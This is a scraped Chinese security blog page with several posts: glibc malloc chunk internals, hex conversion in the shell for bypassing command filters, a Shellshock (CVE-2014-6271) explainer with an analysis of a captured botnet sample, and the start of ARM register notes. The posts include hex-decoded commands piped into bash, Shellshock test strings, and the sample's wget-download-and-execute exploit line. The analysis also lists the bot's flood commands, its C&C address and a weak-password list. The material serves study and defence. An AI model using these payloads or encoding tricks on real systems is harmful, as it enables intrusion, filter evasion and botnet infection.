<p>首先思考：是否有必要同时保存当前chunk和<strong>前一个chunk的已分配/空闲标记位？答案是否定的，因为我们只需要保存前一个chunk的分配标志位就可以了，至于当前chunk的分配标志位，可以通过查询下一个chunk的size字段得到</strong>。那么size字段中剩下的两个比特位就可以用于满足多线程的标志需求了：</p>
<p><img src="/images/2017-09-10/v2-9a5a0e9737b5dcb4e14ec4d186d8ddf6_b.png" alt=""></p>
<p>图5-7 多线程版本Knuth边界标记allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-66621268cd9759bd19e6dc07a41eab9c_b.png" alt=""></p>
<p>图5-8 多线程版本Knuth边界标记free chunk格式</p>
<p>这里的P,M,N的含义如下：</p>
<blockquote>
<p>PREV_INUSE(P): 表示前一个chunk是否为allocated。</p>
<p>IS_MMAPPED(M)：表示当前chunk是否是通过mmap系统调用产生的。</p>
<p>NON_MAIN_ARENA(N)：表示当前chunk是否是thread arena。</p>
</blockquote>
<p>再进一步，发现没必要保存chunk size的副本，也就是说Footer的作用并不大，但是如果前一个chunk是free的话，在合并的时候我们又需要知道前一个chunk的大小，怎么办呢？将Footer从尾部移到首部，同时其不再保存当前chunk的size，而是前一个free chunk的size不就行了。同样的，为了提高内存利用率，如果前一个chunk是allocated chunk的话，这个Footer就作为allocated chunk的payload或padding的一部分，结构图如下：</p>
<p><img src="/images/2017-09-10/v2-42f98a954d6d13971d640b34bfe60b55_b.png" alt=""></p>
<p>图5-9 当前glibc malloc allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-9dcc9c637c66bae48402c9bb9d11d568_b.png" alt=""></p>
<p>图5-10 当前glibc malloc free chunk格式</p>
<p>至此，glibc malloc堆内存管理器中使用的隐式链表技术就介绍完毕了。现在我们再回过头去看malloc_chunk结构体就很好理解了：该结构体通过每个chunk的prev_size和size构成了隐式链表，而后续的fd, bk等指针并不是作用于隐式链表的，而是用于后文会介绍的用于加快内存分配和释放效率的显示链表bin(还记得bin么？用于记录同一类型free chunk的链表)，并且这些指针跟prev_size一样只在free chunk中存在。关于显示链表bin的原理比较复杂，让我们带着疑惑，暂时略过这部分信息，等介绍完所有chunk之后再加以详细介绍。</p>
<h4 id="5-2-Top-Chunk"><a href="#5-2-Top-Chunk" class="headerlink" title="5.2 Top Chunk"></a>5.2 Top Chunk</h4><p>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<h4 id="5-3-Last-Remainder-Chunk"><a href="#5-3-Last-Remainder-Chunk" class="headerlink" title="5.3 Last Remainder Chunk"></a>5.3 Last Remainder Chunk</h4><p>要想理解此chunk就必须先理解glibc malloc中的bin机制。如果你已经看了第二部分文章，那么下面的原理就很好理解了，否则建议你先阅读第二部分文章。对于Last remainder chunk，我们主要有两个问题：1)它是怎么产生的；2)它的作用是什么？</p>
<p>先回答第一个问题。还记得第二部分文章中对small bin的malloc机制的介绍么？当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk</strong>。</p>
<p>然后回答第二个问题。此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p>
<p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index" target="_blank" rel="external"><strong>阿里聚安全博客 </strong></a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/09/pwn/shell下的进制转换/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/09/pwn/shell下的进制转换/" itemprop="url">shell下的进制转换</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-09T21:44:35+08:00">
                2017-09-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近一直在学filter绕过的姿势，所以急需shell下绕过的方法，其中关键的一环就是shell下的进制转换！</p>
<p>主要参考：</p>
<p><a href="https://stackoverflow.com/questions/1604765/linux-shell-scripting-hex-string-to-bytes" target="_blank" rel="external">https://stackoverflow.com/questions/1604765/linux-shell-scripting-hex-string-to-bytes</a></p>
<p><a href="https://stackoverflow.com/questions/6292645/convert-binary-data-to-hex-in-shell-script" target="_blank" rel="external">https://stackoverflow.com/questions/6292645/convert-binary-data-to-hex-in-shell-script</a></p>
<p>进制转换有多种工具，在linux上常见的有hexdump、od -x、xxd等</p>
<p>下面我们来简单介绍一下这些命令</p>
<h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><p>xxd比较常用，也比较好用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">Usage:</div><div class="line">       xxd [options] [infile [outfile]]</div><div class="line">    or</div><div class="line">       xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]</div><div class="line">Options:</div><div class="line">    -a          toggle autoskip: A single '*' replaces nul-lines. Default off.</div><div class="line">    -b          binary digit dump (incompatible with -ps,-i,-r). Default hex.</div><div class="line">    -c cols     format &lt;cols&gt; octets per line. Default 16 (-i: 12, -ps: 30).</div><div class="line">    -E          show characters in EBCDIC. Default ASCII.</div><div class="line">    -e          little-endian dump (incompatible with -ps,-i,-r).</div><div class="line">    -g          number of octets per group in normal output. Default 2 (-e: 4).</div><div class="line">    -h          print this summary.</div><div class="line">    -i          output in C include file style.</div><div class="line">    -l len      stop after &lt;len&gt; octets.</div><div class="line">    -o off      add &lt;off&gt; to the displayed file position.</div><div class="line">    -ps         output in postscript plain hexdump style.</div><div class="line">    -r          reverse operation: convert (or patch) hexdump into binary.</div><div class="line">    -r -s off   revert with &lt;off&gt; added to file positions found in hexdump.</div><div class="line">    -s [+][-]seek  start at &lt;seek&gt; bytes abs. (or +: rel.) infile offset.</div><div class="line">    -u          use upper case hex letters.</div><div class="line">    -v          show version: "xxd V1.10 27oct98 by Juergen Weigert".</div><div class="line">    -p：以一个整块输出所有的hex， 不使用空格进行分割</div></pre></td></tr></table></figure>
<p>上面的是xxd的用法，下面我们来逐步介绍！</p>
<blockquote>
<p> 将0x313233解释成123</p>
<p> root@test:/# echo 0x313233| xxd -r<br> 123root@test:/#</p>
</blockquote>
<blockquote>
<p>将123解释成0x313233</p>
<p>root@test:/# echo 123|xxd -ps<br>3132330a</p>
</blockquote>
<font color="#f00">需要注意的是，我们不能直接使用xxd -r 0x313233，原因是xxd后面只能接文件！而echo 123，并用管道连接，其实就是创建了一个临时文件交给xxd来处理</font>

<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>​    每行有限定字符个数，xxd -ps限定每行最多有60个16进制数</p>
<p>​    而xxd -r则至多转换16个字符</p>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "export FF=\"/tmp/flag\";cat \$FF;echo vunerable"|xxd -p</div><div class="line">6578706f72742046463d222f746d702f666c6167223b636174202446463b</div><div class="line">6563686f2076756e657261626c650a</div><div class="line">root@test:/# echo "export FF=\"/tmp/flag\";cat \$FF;echo vunerable"|xxd -p|tr -d '\n'</div><div class="line">6578706f72742046463d222f746d702f666c6167223b636174202446463b6563686f2076756e657261626c650aroot@test:/#</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "export FF=\"/tmp/flag\""|xxd -p</div><div class="line">6578706f72742046463d222f746d702f666c6167220a</div><div class="line">root@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -rp</div><div class="line">export FF="/tmp/root@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -r -p</div><div class="line">export FF="/tmp/flag"root@test:/#</div></pre></td></tr></table></figure>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
<li>对于字符串转16进制中每行60个16进制的限制，可以使用echo 123|xxd -p|tr -d &#39;\n&#39;</li>
</ul>
<ul>
<li>对于16进制转字符串中至多转换16个字符的限制，可以使用xxd -r -p中的r和p一定得分开</li>
</ul>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "flag is here" &gt; /tmp/flag</div><div class="line">root@test:/# echo "\"export FF='/tmp/flag';cat \$FF\""|xxd -p|tr -d '\n'</div><div class="line">226578706f72742046463d272f746d702f666c6167273b63617420244646220aroot@test:/# </div><div class="line">root@test:/# echo 0x226578706f72742046463d272f746d702f666c6167273b6361742024464622|xxd -r -p|xargs bash -c</div><div class="line">flag is here</div></pre></td></tr></table></figure>
<p>上面的应用综合利用了所学的知识，其中前两步是铺垫，最后一步才是真正的poc。需要注意的是bash -c 一定接字符串，而且该字符串需要用双引号括起来！</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "flag is here" &gt; /tmp/flag</div><div class="line">root@test:/# echo "export FF='/tmp/flag';cat \$FF"|xxd -p|tr -d '\n'</div><div class="line">6578706f72742046463d272f746d702f666c6167273b636174202446460aroot@test:/# </div><div class="line">root@test:/# echo 0x6578706f72742046463d272f746d702f666c6167273b63617420244646|xxd -r -p|bash -i</div><div class="line">root@test:/# export FF='/tmp/flag';cat $FF</div><div class="line">flag is here</div><div class="line">root@test:/# exit</div></pre></td></tr></table></figure>
<p>上面同样是十分完美的应用，主要特点是使用了bash -i，这相当于一个交互式的应用，管道线前面输出的内容会在这个交互中完成，完成后立刻退出！注意，管道线前面输出的内容不能用双引号括起来！</p>
<h3 id="perl的妙用"><a href="#perl的妙用" class="headerlink" title="perl的妙用"></a>perl的妙用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat found | sed &apos;s/.*: &quot;//g;s/ .*//;s/^0*//&apos; | xargs python -c &apos;import sys; print &quot;&quot;.join([bin(int(x)).lstrip(&quot;0b&quot;) for x in sys.argv[1:]])&apos; | perl -lpe &apos;$_=pack(&quot;B*&quot;,$_)&apos;</div><div class="line">最后的代码意思是前面管道输入的01字符串打包成8字节的字符串</div><div class="line"></div><div class="line">将A\B两种不同代码替换，并输出成字符串</div><div class="line">echo ABBBAAAABBBBBABBABBBABBB | perl -pe &apos;BEGIN &#123; binmode \*STDOUT &#125; chomp; tr/AB/\0\1/; $_ = pack &quot;B*&quot;, $_&apos;</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/09/pwn/shellshock原理介绍/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/09/pwn/shellshock原理介绍/" itemprop="url">shellshock原理介绍</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-09T13:18:47+08:00">
                2017-09-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="一-漏洞事件介绍"><a href="#一-漏洞事件介绍" class="headerlink" title="一.漏洞事件介绍"></a><strong>一.漏洞事件介绍</strong></h2><h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a><strong>1.漏洞信息</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">●发布时间:2014-09-25　14时48分04秒</div><div class="line">●CVE ID:CVE-2014-6271</div><div class="line">●受影响版本:</div></pre></td></tr></table></figure>
<p><a href="http://image.3001.net/images/20140929/14119555774668.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119555774668.png%21small" alt="受ShellShock影响的版本"></a></p>
<h3 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a><strong>2.漏洞概述</strong></h3><p><strong>Bash(GNU Bourne-Again Shell)</strong>是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中，以实现windows的POSIX虚拟接口.</p>
<p>Bash其广泛的使用将意味全球至少 150 万的主机将受到影响，此外 Linux/Unix 世界内的安卓和苹果都难以幸免。</p>
<p><a href="http://www.freebuf.com/news/44805.html" target="_blank" rel="external">破壳漏洞（ShellShock）</a>的严重性被定义为 10 级（最高）,而今年 4 月爆发的 OpenSSL(心脏出血)漏洞才 5 级！</p>
<h3 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3.漏洞成因:"></a><strong>3.漏洞成因:</strong></h3><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统</p>
<p>受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令</p>
<h3 id="4-漏洞测试"><a href="#4-漏洞测试" class="headerlink" title="4.漏洞测试:"></a><strong>4.漏洞测试:</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(1).CVE-2014-6271 测试方式:</div><div class="line">      env x='() &#123; :;&#125;; exp' bash -c "echo this is a test" </div><div class="line">(2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)</div><div class="line">      env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</div></pre></td></tr></table></figure>
<h3 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a><strong>5.修复方案</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">请广大站长及时关注官网的安全补丁更新</div><div class="line">(1).针对RedHat、CentOS Liunx发行版本，请执行：</div><div class="line">    yum -y update bash</div><div class="line">(2).针对Debian Liunx发行版本，请执行：</div><div class="line">    sudo apt-get update &amp;&amp; sudo apt-get install --only-upgrade bash</div></pre></td></tr></table></figure>
<h2 id="二-样本概述"><a href="#二-样本概述" class="headerlink" title="二.样本概述"></a><strong>二.样本概述</strong></h2><h3 id="●样本来源"><a href="#●样本来源" class="headerlink" title="●样本来源:"></a><strong>●样本来源:</strong></h3><p>由于2014年9月24日法国某Linux爱好者公布了BASH漏洞(CVE-2014-6721),时至今日网络上已有利用该漏洞的病毒样本,我们于今日捕获到该漏洞样本,并进行了紧急分析</p>
<h3 id="●文件信息"><a href="#●文件信息" class="headerlink" title="●文件信息:"></a><strong>●文件信息:</strong></h3><p>文件名:nginx</p>
<p>文件大小:525KB</p>
<p>MD5:5924bcc045bb7039f55c6ce29234e29a  </p>
<p><a href="http://image.3001.net/images/20140929/14119556446899.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119556446899.png%21small" alt="Bash 样本文件信息"></a></p>
<h3 id="●行为概述"><a href="#●行为概述" class="headerlink" title="●行为概述:"></a><strong>●行为概述:</strong></h3><p>该漏洞样本利用Bash漏洞进行传播扩散,并使用Linux Shell命令wget下载该样本并执行,该样本执行后首先会收集系统相关的信息(CPU,网络配置等信息),紧接着样本连接到自己的服务器,通过接受服务器发送的指令,来远程控制被感染机器,进而组建僵尸网络,进行洪水攻击,以及入侵中国某厂商,而入侵之后主要是为了莱特币的挖取</p>
<h2 id="三-样本详细分析"><a href="#三-样本详细分析" class="headerlink" title="三.样本详细分析"></a><strong>三.样本详细分析</strong></h2><h3 id="1-样本传播方式"><a href="#1-样本传播方式" class="headerlink" title="1.样本传播方式"></a><strong>1.样本传播方式</strong></h3><p>该样本利用Bash漏洞进行传播,其漏洞的利用只需要简单的几行命令即可,这无疑为利用者带来了极大的便利,利用代码如下:</p>
<p><a href="http://image.3001.net/images/20140929/14119557242937.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557242937.png%21small" alt="Bash样本利用代码"></a></p>
<p>而该样本通过wget将样本下载并执行,利用漏洞命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie, ().&#123;.:;.&#125;;.wget /tmp/besh http://X.X.X.X/nginx; chmod.777 /tmp/besh; /tmp/besh;</div></pre></td></tr></table></figure>
<h3 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a><strong>2.样本行为分析</strong></h3><p><strong>(1).获取计算机相关信息</strong></p>
<p>该样本启动后首先会获取计算机的相关信息,如CPU,网络配置等信息</p>
<p><a href="http://image.3001.net/images/20140929/14119557383644.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557383644.png%21small" alt="Bash样本获取计算机信息"></a></p>
<p><strong>(2).接着该样本连接自己的服务器(89.238.150.154:5)</strong></p>
<p>strace附加在创建的子进程样本上监视其行为如下:</p>
<p><a href="http://image.3001.net/images/20140929/14119557523092.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557523092.png%21small" alt="Bash样本连接自己的服务器"></a></p>
<p>但是C&amp;C的server已经挂掉了</p>
<p><strong>(3).如果连接服务器成功,则根据服务器传来的指令,远程控制被感染机器,命令集合如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PING </div><div class="line">GETLOCALIP </div><div class="line">SCANNER </div><div class="line">HOLD (DoS Flood) </div><div class="line">JUNK (DoS Flood) </div><div class="line">UDP (DoS Flood) </div><div class="line">TCP (DoS Flood) </div><div class="line">KILLATTK </div><div class="line">LOLNOGTFO</div></pre></td></tr></table></figure>
<p><strong>●PING命令:</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119557641898.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557641898.png%21small" alt="Bash样本服务器的PING命令"></a></p>
<p>类似于心跳包,测试客户端服务器是否连接成功</p>
<p><strong>●GETLOCALIP</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119557764384.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557764384.png%21small" alt="发送本机IP地址到目标服务器"></a></p>
<p>发送本机IP地址到目标服务器</p>
<p><strong>●SCANNER</strong></p>
<p>其主要是通过Busybox来对字符进行解析,从而设定扫描攻击目标,然后通过DVR scanner来对目标DVR设备进行扫描,看是否存在DVR漏洞,进而发起攻击</p>
<p><a href="http://image.3001.net/images/20140929/14119557914517.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557914517.png%21small" alt="Bash样本SCANNER"></a></p>
<p>我们通过busybox来对该字符串进行解析得到</p>
<p><a href="http://image.3001.net/images/20140929/14119558016271.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558016271.png%21small" alt="字符串剖析结果"></a></p>
<p>然而在样本中,我们发现:</p>
<p><a href="http://image.3001.net/images/20140929/14119558124398.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558124398.png%21small" alt="Bash样本中DVR Scanner"></a></p>
<p>DVR Scanner主要测试目标是否存在DVR漏洞,如果存在则尝试通过像”root”,”12345”这样的弱口令进行进行连接,如果连接成功,则执行ps尝试寻找”cmd.so”进程,该进程主要是莱特币矿工相关.</p>
<p>于是可以高度怀疑通过此方法来挖取莱特币</p>
<p>程序中存在的弱口令表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root </div><div class="line">admin </div><div class="line">user </div><div class="line">login </div><div class="line">guest </div><div class="line">toor </div><div class="line">changeme </div><div class="line">1234 </div><div class="line">12345 </div><div class="line">123456 </div><div class="line">default </div><div class="line">pass </div><div class="line">password</div></pre></td></tr></table></figure>
<p><strong>●HOLD (Dos Flood)</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558398157.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558398157.png%21small" alt="对目标服务器进行Hold洪水攻击"></a></p>
<p>对目标服务器进行Hold洪水攻击,通过接受服务器数据包,来指明需要攻击的秒数,并将攻击时间返回给服务器</p>
<p><strong>●JUNK (DoS Flood) </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558506793.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558506793.png%21small" alt="对目标服务器进行JUNK洪水攻击"></a></p>
<p>对目标服务器进行JUNK洪水攻击</p>
<p><strong>●UDP (DoS Flood)</strong> </p>
<p><a href="http://image.3001.net/images/20140929/14119558625359.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558625359.png%21small" alt="对目标服务器进行UDP洪水攻击"></a></p>
<p>对目标服务器进行UDP洪水攻击</p>
<p><strong>●TCP (DoS Flood) </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558712704.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558712704.png%21small" alt="对目标服务器进行TCP洪水攻击"></a></p>
<p>对目标服务器进行TCP洪水攻击</p>
<p><strong>●KILLATTK </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558833165.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558833165.png%21small" alt="通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程"></a></p>
<p>通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程</p>
<p><strong>●LOLNOGTFO</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558966991.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558966991.png%21small" alt="非法服务器数据包指令"></a></p>
<p>非法服务器数据包指令</p>
<h2 id="三-后台漏洞检测"><a href="#三-后台漏洞检测" class="headerlink" title="三.后台漏洞检测"></a><strong>三.后台漏洞检测</strong></h2><p>漏洞爆发之后,我们在后台对全国范围内的相关网站进行了一次统计,我们发现了某公司的NAS设备管理页面存在cgi漏洞,而通过查看网站页面，发现设备是类似“TS-119P”， 设备名都是TS-XX的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">备注：NAS是一种网络存储设备，现在的很多路由器也支持此功能，如果此设备有漏洞，那么里面的资源都会有被盗的风险。XXX门将会再现江湖</div></pre></td></tr></table></figure>
<p>为此我们搭建了一个后台页面,来对网址进行检测,查看是否存在Bash漏洞</p>
<p><a href="http://image.3001.net/images/20140929/14119559071040.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119559071040.png%21small" alt="ShellShock检测页面"></a></p>
<p><strong>检测网址如下:</strong></p>
<p><a href="http://fish.ijinshan.com/cgibincheck" target="_blank" rel="external">http://fish.ijinshan.com/cgibincheck</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/08/pwn/ARM寄存器结构小记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/08/pwn/ARM寄存器结构小记/" itemprop="url">ARM寄存器结构小记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-08T22:43:17+08:00">
                2017-09-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>ARM处理器共有37个寄存器，被分为若干个组，这些寄存器包括：</p>
<ul>
<li>31个通用寄存器，包括未分组寄存器R0-R7、分组寄存器R8-R14和程序计数器（ PC 指针），均为32位的寄存器。</li>
